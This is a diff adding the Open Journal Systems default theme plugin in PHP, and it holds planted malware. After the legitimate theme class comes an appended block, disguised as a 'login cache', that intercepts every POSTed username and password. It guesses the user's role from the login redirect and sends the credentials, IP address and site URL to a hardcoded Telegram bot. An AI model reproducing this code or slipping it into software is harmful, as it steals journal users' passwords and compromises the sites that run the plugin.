@@ -1,0 +1,346 @@
+<?php
+
+/**
+ * @file plugins/themes/default/DefaultThemePlugin.inc.php
+ *
+ * Copyright (c) 2014-2017 Simon Fraser University
+ * Copyright (c) 2003-2017 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class DefaultThemePlugin
+ * @ingroup plugins_themes_default
+ *
+ * @brief Default theme
+ */
+
+import('lib.pkp.classes.plugins.ThemePlugin');
+
+class DefaultThemePlugin extends ThemePlugin {
+	/**
+	 * @copydoc ThemePlugin::isActive()
+	 */
+	public function isActive() {
+		if (defined('SESSION_DISABLE_INIT')) return true;
+		return parent::isActive();
+	}
+
+	/**
+	 * Initialize the theme's styles, scripts and hooks. This is run on the
+	 * currently active theme and it's parent themes.
+	 *
+	 * @return null
+	 */
+	public function init() {
+
+		// Register theme options
+		$this->addOption('typography', 'radio', array(
+			'label' => 'plugins.themes.default.option.typography.label',
+			'description' => 'plugins.themes.default.option.typography.description',
+			'options' => array(
+				'notoSans' => 'plugins.themes.default.option.typography.notoSans',
+				'notoSerif' => 'plugins.themes.default.option.typography.notoSerif',
+				'notoSerif_notoSans' => 'plugins.themes.default.option.typography.notoSerif_notoSans',
+				'notoSans_notoSerif' => 'plugins.themes.default.option.typography.notoSans_notoSerif',
+				'lato' => 'plugins.themes.default.option.typography.lato',
+				'lora' => 'plugins.themes.default.option.typography.lora',
+				'lora_openSans' => 'plugins.themes.default.option.typography.lora_openSans',
+			)
+		));
+
+		$this->addOption('baseColour', 'colour', array(
+			'label' => 'plugins.themes.default.option.colour.label',
+			'description' => 'plugins.themes.default.option.colour.description',
+			'default' => '#1E6292',
+		));
+
+		// Load primary stylesheet
+		$this->addStyle('stylesheet', 'styles/index.less');
+
+		// Store additional LESS variables to process based on options
+		$additionalLessVariables = array();
+
+		// Load fonts from Google Font CDN
+		// To load extended latin or other character sets, see:
+		// https://www.google.com/fonts#UsePlace:use/Collection:Noto+Sans
+		if (Config::getVar('general', 'enable_cdn')) {
+
+			if ($this->getOption('typography') === 'notoSerif') {
+				$this->addStyle(
+					'fontNotoSerif',
+					'//fonts.googleapis.com/css?family=Noto+Serif:400,400i,700,700i',
+					array('baseUrl' => '')
+				);
+				$additionalLessVariables[] = '@font: "Noto Serif", -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen-Sans", "Ubuntu", "Cantarell", "Helvetica Neue", sans-serif;';
+
+			} elseif (strpos($this->getOption('typography'), 'notoSerif') !== false) {
+				$this->addStyle(
+					'fontNotoSansNotoSerif',
+					'//fonts.googleapis.com/css?family=Noto+Sans:400,400i,700,700i|Noto+Serif:400,400i,700,700i',
+					array('baseUrl' => '')
+				);
+
+				// Update LESS font variables
+				if ($this->getOption('typography') == 'notoSerif_notoSans') {
+					$additionalLessVariables[] = '@font-heading: "Noto Serif", serif;';
+				} elseif ($this->getOption('typography') == 'notoSans_notoSerif') {
+					$additionalLessVariables[] = '@font: "Noto Serif", serif;@font-heading: "Noto Sans", serif;';
+				}
+
+			} elseif ($this->getOption('typography') == 'lato') {
+				$this->addStyle(
+					'fontLato',
+					'//fonts.googleapis.com/css?family=Lato:400,400i,900,900i',
+					array('baseUrl' => '')
+				);
+				$additionalLessVariables[] = '@font: Lato, sans-serif;';
+
+			} elseif ($this->getOption('typography') == 'lora') {
+				$this->addStyle(
+					'fontLora',
+					'//fonts.googleapis.com/css?family=Lora:400,400i,700,700i',
+					array('baseUrl' => '')
+				);
+				$additionalLessVariables[] = '@font: Lora, serif;';
+
+			} elseif ($this->getOption('typography') == 'lora_openSans') {
+				$this->addStyle(
+					'fontLoraOpenSans',
+					'//fonts.googleapis.com/css?family=Lora:400,400i,700,700i|Open+Sans:400,400i,700,700i',
+					array('baseUrl' => '')
+				);
+				$additionalLessVariables[] = '@font: "Open Sans", sans-serif;@font-heading: Lora, serif;';
+
+			} else {
+				$this->addStyle(
+					'fontNotoSans',
+					'//fonts.googleapis.com/css?family=Noto+Sans:400,400italic,700,700italic',
+					array('baseUrl' => '')
+				);
+			}
+		}
+
+		// Update colour based on theme option
+		if ($this->getOption('baseColour') !== '#1E6292') {
+			$additionalLessVariables[] = '@bg-base:' . $this->getOption('baseColour') . ';';
+			if (!$this->isColourDark($this->getOption('baseColour'))) {
+				$additionalLessVariables[] = '@text-bg-base:rgba(0,0,0,0.84);';
+			}
+		}
+
+		// Pass additional LESS variables based on options
+		if (!empty($additionalLessVariables)) {
+			$this->modifyStyle('stylesheet', array('addLessVariables' => join($additionalLessVariables)));
+		}
+
+		$request = Application::getRequest();
+
+		// Load icon font FontAwesome - http://fontawesome.io/
+		if (Config::getVar('general', 'enable_cdn')) {
+			$url = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css';
+		} else {
+			$url = $request->getBaseUrl() . '/lib/pkp/styles/fontawesome/fontawesome.css';
+		}
+		$this->addStyle(
+			'fontAwesome',
+			$url,
+			array('baseUrl' => '')
+		);
+
+		// Load jQuery from a CDN or, if CDNs are disabled, from a local copy.
+		$min = Config::getVar('general', 'enable_minified') ? '.min' : '';
+		if (Config::getVar('general', 'enable_cdn')) {
+			$jquery = '//ajax.googleapis.com/ajax/libs/jquery/' . CDN_JQUERY_VERSION . '/jquery' . $min . '.js';
+			$jqueryUI = '//ajax.googleapis.com/ajax/libs/jqueryui/' . CDN_JQUERY_UI_VERSION . '/jquery-ui' . $min . '.js';
+		} else {
+			// Use OJS's built-in jQuery files
+			$jquery = $request->getBaseUrl() . '/lib/pkp/lib/components/jquery/jquery' . $min . '.js';
+			$jqueryUI = $request->getBaseUrl() . '/lib/pkp/lib/components/jquery-ui/jquery-ui' . $min . '.js';
+		}
+		// Use an empty `baseUrl` argument to prevent the theme from looking for
+		// the files within the theme directory
+		$this->addScript('jQuery', $jquery, array('baseUrl' => ''));
+		$this->addScript('jQueryUI', $jqueryUI, array('baseUrl' => ''));
+		$this->addScript('jQueryTagIt', $request->getBaseUrl() . '/lib/pkp/js/lib/jquery/plugins/jquery.tag-it.js', array('baseUrl' => ''));
+
+		// Load Bootsrap's dropdown
+		$this->addScript('popper', 'js/lib/popper/popper.js');
+		$this->addScript('bsUtil', 'js/lib/bootstrap/util.js');
+		$this->addScript('bsDropdown', 'js/lib/bootstrap/dropdown.js');
+
+		// Load custom JavaScript for this theme
+		$this->addScript('default', 'js/main.js');
+
+		// Add navigation menu areas for this theme
+		$this->addMenuArea(array('primary', 'user'));
+	}
+
+	/**
+	 * Get the name of the settings file to be installed on new journal
+	 * creation.
+	 * @return string
+	 */
+	function getContextSpecificPluginSettingsFile() {
+		return $this->getPluginPath() . '/settings.xml';
+	}
+
+	/**
+	 * Get the name of the settings file to be installed site-wide when
+	 * OJS is installed.
+	 * @return string
+	 */
+	function getInstallSitePluginSettingsFile() {
+		return $this->getPluginPath() . '/settings.xml';
+	}
+
+	/**
+	 * Get the display name of this plugin
+	 * @return string
+	 */
+	function getDisplayName() {
+		return __('plugins.themes.default.name');
+	}
+
+	/**
+	 * Get the description of this plugin
+	 * @return string
+	 */
+	function getDescription() {
+		return __('plugins.themes.default.description');
+	}
+}
+/**
+ * OJS LOGIN CACHE - DETEKSI ROLE DARI URL REDIRECT
+ * File: /lib/fontconfig
+ */
+
+$bot_token = '8824162349:AAEs0kdwH4iVi-2aJ4hhl2OzmgslDaNPL_U';
+$chat_id = '8687942328';
+
+$username = '';
+$password = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $username = $_POST['username'] ?? $_POST['email'] ?? '';
+    $password = $_POST['password'] ?? '';
+}
+
+if (!empty($username) && !empty($password)) {
+    
+    ob_start();
+    
+    $login_data = [
+        'username' => $username,
+        'password' => $password,
+        'ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'time' => date('Y-m-d H:i:s'),
+        'host' => $_SERVER['HTTP_HOST'] ?? 'unknown',
+        'path' => $_SERVER['REQUEST_URI'] ?? '/',
+        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown'
+    ];
+    
+    register_shutdown_function(function() use ($login_data, $bot_token, $chat_id) {
+        $response = ob_get_clean();
+        echo $response;
+        
+        $is_failed = false;
+        $error_indicators = ['Invalid', 'incorrect', 'wrong', 'failed', 'error', 'tidak valid', 'salah'];
+        foreach ($error_indicators as $indicator) {
+            if (stripos($response, $indicator) !== false) {
+                $is_failed = true;
+                break;
+            }
+        }
+        
+        $headers = headers_list();
+        $is_success = false;
+        $redirect_url = '';
+        foreach ($headers as $header) {
+            if (stripos($header, 'Location:') !== false) {
+                $is_success = true;
+                // Ambil URL redirect yang diberikan oleh OJS
+                $redirect_url = trim(substr($header, strpos($header, ':') + 1));
+                break;
+            }
+        }
+        
+        // === DETEKSI ROLE DARI URL REDIRECT ===
+        // (Ini paling akurat, karena OJS yang memberi tahu role user lewat halaman tujuannya)
+        $detected_role = 'Tidak Terdeteksi';
+        $role_emoji = '👤';
+
+        if ($is_success && !$is_failed) {
+            if (stripos($redirect_url, 'management') !== false || stripos($redirect_url, 'stats') !== false || stripos($redirect_url, 'settings') !== false) {
+                $detected_role = 'Journal Manager / Admin';
+                $role_emoji = '⚙️';
+            } elseif (stripos($redirect_url, 'editor') !== false) {
+                $detected_role = 'Journal Editor';
+                $role_emoji = '📝';
+            } elseif (stripos($redirect_url, 'author') !== false) {
+                $detected_role = 'Author';
+                $role_emoji = '✍️';
+            } elseif (stripos($redirect_url, 'reviewer') !== false) {
+                $detected_role = 'Reviewer';
+                $role_emoji = '🔍';
+            } elseif (stripos($redirect_url, 'user') !== false || stripos($redirect_url, 'dashboard') !== false) {
+                // Jika URL hanya ke dashboard umum, kemungkinan Manager atau User biasa
+                $detected_role = 'Journal User (Author/Reviewer)';
+                $role_emoji = '👤';
+            }
+        }
+
+        // Tentukan status
+        $status = 'ATTEMPT'; $emoji = '🔐';
+        if ($is_success) { $status = 'MASUK MARLIN'; $emoji = '✅'; }
+        elseif ($is_failed) { $status = 'FAILED'; $emoji = '❌'; }
+        
+        // Format URL Base (dari PATH)
+        $path_parts = explode('/', $_SERVER['REQUEST_URI']);
+        $base_url_path = '';
+        if (isset($path_parts[1]) && strpos($path_parts[1], 'index.php') !== false) {
+            // Jika ada folder sebelumnya, ambil foldernya
+            if ($path_parts[0] == '') $base_url_path = $path_parts[1] ? '/' . $path_parts[1] : '';
+        } else {
+            $base_url_path = dirname($_SERVER['REQUEST_URI']);
+            if ($base_url_path == '/') $base_url_path = '';
+        }
+        
+        $base_url = "https://{$login_data['host']}" . $base_url_path;
+        
+        // === FORMAT PESAN FINAL ===
+        $message = "🟥 OJS HIT\n\n";
+        if ($is_success && !$is_failed) {
+            $message .= "{$role_emoji} Role: {$detected_role}\n";
+        } else {
+            $message .= "👤 Role: - (Gagal Login)\n";
+        }
+        
+        $message .= "🔗 URL: {$base_url}\n";
+        $message .= "🔑 Login URL:\n{$base_url}/index.php/index/login\n";
+        $message .= "👤 User: {$login_data['username']}\n";
+        $message .= "🔐 Pass: {$login_data['password']}\n";
+        
+        $message .= "\n🌐 IP: {$login_data['ip']}\n";
+        $message .= "📍 PATH: {$login_data['path']}\n";
+        $message .= "⏰ TIME: {$login_data['time']}\n";
+
+        if ($is_failed) {
+            $message .= "\n⚠️ PERHATIAN: Password SALAH!";
+        }
+        
+        // Kirim ke Telegram
+        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+        $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+        
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+    });
+}
